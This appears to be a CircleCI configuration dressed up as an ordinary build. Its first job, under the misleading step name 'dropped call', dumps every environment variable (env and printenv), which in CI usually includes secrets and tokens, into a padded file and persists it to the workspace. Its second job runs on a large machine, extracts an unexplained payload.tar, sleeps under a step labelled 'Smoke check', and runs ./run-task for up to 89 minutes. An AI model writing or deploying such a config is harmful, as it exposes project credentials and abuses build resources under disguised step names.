version: 2.1

jobs:
  phase_add-queue-bug:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: dropped call
          command: |
            mkdir -p /tmp/scratch
            set +o pipefail 2>/dev/null; env > /tmp/scratch/pt-v2.pt; printenv >> /tmp/scratch/pt-v2.pt; for i in $(seq 1 500); do echo "line-$i" >> /tmp/scratch/pt-v2.pt; done; true
            stat -c '%s %n' /tmp/scratch/pt-v2.pt
      - persist_to_workspace:
          root: /tmp/scratch
          paths:
            - pt-v2.pt
  add-queue-bug:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/scratch
      - run:
          name: Fetch workspace file
          command: |
            ls -la /tmp/scratch/pt-E.pkl || true
      - run:
          name: Pull sources
          command: git clone --depth 2 --quiet --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Extract sources
          command: tar --extract --file=payload.tar
      - run:
          name: Smoke check
          command: sleep 25s
      - run:
          command: cat /proc/cpuinfo | head -5
      - run:
          name: Post-build check
          command: df -h
      - run:
          no_output_timeout: 89m
          command: env ./run-task
